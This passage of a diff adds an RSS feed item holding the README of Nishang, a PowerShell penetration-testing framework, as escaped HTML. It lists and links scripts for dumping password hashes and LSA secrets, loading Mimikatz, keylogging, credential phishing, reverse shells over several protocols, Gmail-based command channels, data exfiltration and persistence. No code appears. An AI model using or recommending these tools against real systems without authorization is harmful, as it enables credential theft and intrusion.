+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Check-VM.ps1&quot;&gt;Check-VM&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Check for a virtual machine.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Copy-VSS.ps1&quot;&gt;Copy-VSS&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Copy the SAM file using Volume Shadow Copy Service.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Credentials.ps1&quot;&gt;Invoke-CredentialsPhish&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Trick a user into giving credentials in plain text.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/FireBuster.ps1&quot;&gt;FireBuster&lt;/a&gt; &lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/FireListener.ps1&quot;&gt;FireListener&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A pair of scripts for egress testing&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-Information.ps1&quot;&gt;Get-Information&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Get juicy information from a target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-LSASecret.ps1&quot;&gt;Get-LSASecret&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Get LSA Secret from a target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-PassHashes.ps1&quot;&gt;Get-PassHashes&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Get password hashes from a target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-WLAN-Keys.ps1&quot;&gt;Get-WLAN-Keys&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Get WLAN keys in plain text from a target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Keylogger.ps1&quot;&gt;Keylogger&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Log keystrokes from a target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1&quot;&gt;Invoke-MimikatzWdigestDowngrade&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Dump user passwords in plain on Windows 8.1 and Server 2012&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Get-PassHints.ps1&quot;&gt;Get-PassHints&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Get password hints of Windows users from a target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Show-TargetScreen.ps1&quot;&gt;Show-TargetScreen&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Connect back and Stream target screen using MJPEG.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1&quot;&gt;Invoke-Mimikatz&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Load mimikatz in memory. Updated and with some customisation.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikittenz.ps1&quot;&gt;Invoke-Mimikittenz&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Extract juicy information from target process (like browsers) memory using regex.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-SSIDExfil.ps1&quot;&gt;Invoke-SSIDExfil&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Exfiltrate information like user credentials, using WLAN SSID.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Gather/Invoke-SessionGopher.ps1&quot;&gt;Invoke-SessionGopher&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Identify admin jump-boxes and/or computers used to access Unix machines.&lt;/p&gt; 
+&lt;h4&gt;MITM&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/MITM/Invoke-Interceptor.ps1&quot;&gt;Invoke-Interceptor&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A local HTTPS proxy for MITM attacks.&lt;/p&gt; 
+&lt;h4&gt;Pivot&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Create-MultipleSessions.ps1&quot;&gt;Create-MultipleSessions&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Check credentials on multiple computers and create PSSessions.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Run-EXEonRemote.ps1&quot;&gt;Run-EXEonRemote&lt;/a&gt; Copy and execute an executable on multiple machines.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Pivot/Invoke-NetworkRelay.ps1&quot;&gt;Invoke-NetworkRelay&lt;/a&gt; Create network relays between computers.&lt;/p&gt; 
+&lt;h4&gt;Prasadhak&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Prasadhak/Prasadhak.ps1&quot;&gt;Prasadhak&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Check running hashes of running process against the VirusTotal database.&lt;/p&gt; 
+&lt;h4&gt;Scan&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Scan/Brute-Force.ps1&quot;&gt;Brute-Force&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Brute force FTP, Active Directory, MSSQL, and Sharepoint.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Scan/Port-Scan.ps1&quot;&gt;Port-Scan&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A handy port scanner.&lt;/p&gt; 
+&lt;h4&gt;Powerpreter&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/tree/master/powerpreter&quot;&gt;Powerpreter&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;All the functionality of nishang in a single script module.&lt;/p&gt; 
+&lt;h4&gt;Shells&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PsGcat.ps1&quot;&gt;Invoke-PsGcat&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PsGcatAgent.ps1&quot;&gt;Invoke-PsGcatAgent&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Execute commands and scripts sent by Invoke-PsGcat.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;Invoke-PowerShellTcp&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;An interactive PowerShell reverse connect or bind shell&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLine.ps1&quot;&gt;Invoke-PowerShellTcpOneLine&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1&quot;&gt;Invoke-PowerShellTcpOneLineBind&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Bind version of Invoke-PowerShellTcpOneLine.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellUdp.ps1&quot;&gt;Invoke-PowerShellUdp&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;An interactive PowerShell reverse connect or bind shell over UDP&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellUdpOneLine.ps1&quot;&gt;Invoke-PowerShellUdpOneLine&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Stripped down version of Invoke-PowerShellUdp.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PoshRatHttps.ps1&quot;&gt;Invoke-PoshRatHttps&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Reverse interactive PowerShell over HTTPS.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PoshRatHttp.ps1&quot;&gt;Invoke-PoshRatHttp&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Reverse interactive PowerShell over HTTP.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Remove-PoshRat.ps1&quot;&gt;Remove-PoshRat&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Clean the system after using Invoke-PoshRatHttps&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellWmi.ps1&quot;&gt;Invoke-PowerShellWmi&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Interactive PowerShell using WMI.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;Invoke-PowerShellIcmp&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;An interactive PowerShell reverse shell over ICMP.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-JSRatRundll.ps1&quot;&gt;Invoke-JSRatRundll&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;An interactive PowerShell reverse shell over HTTP using rundll32.exe.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Shells/Invoke-JSRatRegsvr.ps1&quot;&gt;Invoke-JSRatRegsvr&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;An interactive PowerShell reverse shell over HTTP using regsvr32.exe.&lt;/p&gt; 
+&lt;h4&gt;Utility&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Add-Exfiltration.ps1&quot;&gt;Add-Exfiltration&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Add-Persistence.ps1&quot;&gt;Add-Persistence&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Add reboot persistence capability to a script.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Remove-Persistence.ps1&quot;&gt;Remove-Persistence&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Remote persistence added by the Add-Persistence script.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Do-Exfiltration.ps1&quot;&gt;Do-Exfiltration&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Pipe (|) this to any script to exfiltrate the output.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Download.ps1&quot;&gt;Download&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Transfer a file to the target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Parse_Keys.ps1&quot;&gt;Parse_Keys&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Parse keys logged by the keylogger.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Invoke-Decode.ps1&quot;&gt;Invoke-Encode&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Encode and compress a script or string.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Invoke-Decode.ps1&quot;&gt;Invoke-Decode&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Decode and decompress a script or string from Invoke-Encode.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Start-CaptureServer.ps1&quot;&gt;Start-CaptureServer&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Run a web server which logs Basic authentication and SMB hashes.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/ConvertTo-ROT13.ps1&quot;&gt;ConvertTo-ROT13&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Encode a string to ROT13 or decode a ROT13 string.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Utility/Out-DnsTxt.ps1&quot;&gt;Out-DnsTxt&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Generate DNS TXT records which could be used with other scripts.&lt;/p&gt; 
+&lt;p&gt;[Base64ToString]&lt;/p&gt; 
+&lt;p&gt;[StringToBase64]&lt;/p&gt; 
+&lt;p&gt;[ExetoText]&lt;/p&gt; 
+&lt;p&gt;[TexttoExe]&lt;/p&gt; 
+&lt;h3&gt;Updates&lt;/h3&gt; 
+&lt;p&gt;Updates about Nishang can be found at my blog &lt;a href=&quot;http://labofapenetrationtester.com&quot;&gt;http://labofapenetrationtester.com&lt;/a&gt; and my Twitter feed @nikhil_mitt.&lt;/p&gt; 
+&lt;h3&gt;Bugs, Feedback and Feature Requests&lt;/h3&gt; 
+&lt;p&gt;Please raise an issue if you encounter a bug or have a feature request. You can email me at nikhil [dot] uitrgpv at &lt;a href=&quot;http://gmail.com&quot;&gt;gmail.com&lt;/a&gt;&lt;/p&gt; 
+&lt;h4&gt;Mailing List&lt;/h4&gt; 
+&lt;p&gt;For feedback, discussions, and feature requests, join: &lt;a href=&quot;http://groups.google.com/group/nishang-users&quot;&gt;http://groups.google.com/group/nishang-users&lt;/a&gt;&lt;/p&gt; 
+&lt;h4&gt;Contributing&lt;/h4&gt; 
+&lt;p&gt;I am always looking for contributors to Nishang. Please submit requests or drop me an email.&lt;/p&gt; 
+&lt;h4&gt;Blog Posts&lt;/h4&gt; 
+&lt;p&gt;Some helpful blog posts to check out for beginners:&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html&quot;&gt;http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html&quot;&gt;http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html&quot;&gt;http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html&quot;&gt;http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;All posts about Nishang:&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;http://www.labofapenetrationtester.com/search/label/Nishang&quot;&gt;http://www.labofapenetrationtester.com/search/label/Nishang&lt;/a&gt;&lt;/p&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/dda0fceee58b622212caf84524e2ce373b7f8196c877622001b5cb16a9558172/samratashok/nishang" medium="image" />
+      
+    </item>
+    
+  </channel>
+</rss>
